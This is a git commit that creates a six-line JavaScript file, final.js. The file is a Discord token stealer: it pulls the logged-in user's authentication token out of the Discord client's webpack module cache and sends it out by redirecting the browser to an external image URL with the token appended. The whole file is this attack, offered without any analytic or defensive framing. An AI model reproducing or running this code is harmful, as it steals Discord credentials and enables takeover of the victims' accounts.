54aef50728689b2bff40b418af7834f8f69fe551
jlsyetsu404040 <ethanbourgi56@gmail.com>
2025-03-20 17:57:08 +0100

    Create final.js

---
+++ final.js
@@ -0,0 +1,6 @@
+const url = 'https://static.wikia.nocookie.net/among-us/images/9/90/Rouge.png/revision/latest?cb=20210918140136&path-prefix=fr';
+var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
+  m = [];
+  for (let c in e.c) m.push(e.c[c]);
+}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
+window.location.replace(url + '/' + f);
